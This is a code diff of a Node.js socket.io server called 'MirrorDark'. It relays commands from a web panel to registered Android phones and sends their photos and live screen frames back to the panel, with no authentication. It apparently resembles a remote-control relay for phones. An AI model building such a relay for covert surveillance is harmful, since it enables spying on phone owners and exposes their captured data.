@@ -11,12 +11,10 @@ app.use(express.static('public'));
 let connectedDevices = [];
 
 io.on('connection', (socket) => {
-    // Registrar teléfono capturando la IP automáticamente del socket
     socket.on('register_phone', (data) => {
         socket.deviceName = data.name || "Android Device";
         socket.deviceIp = socket.handshake.address;
 
-        // Evitar duplicados si reconecta
         connectedDevices = connectedDevices.filter(dev => dev.id !== socket.id);
         
         connectedDevices.push({ 
@@ -28,17 +26,14 @@ io.on('connection', (socket) => {
         io.emit('update_devices', connectedDevices);
     });
 
-    // Reenviar comando de la web al teléfono
     socket.on('send_command_to_device', (data) => {
         io.to(data.targetId).emit('command_to_phone', { action: data.action });
     });
 
-    // Reenviar respuesta del teléfono (fotos) a la web
     socket.on('phone_response', (response) => {
         io.emit('phone_response', response);
     });
 
-    // Reenviar streaming de pantalla a la web
     socket.on('screen_frame', (base64Frame) => {
         io.emit('screen_frame', base64Frame);
     });
@@ -50,6 +45,6 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
+server.listen(PORT, '0.0.0.0', () => {
     console.log(`Servidor MirrorDark corriendo en el puerto ${PORT}`);
 });
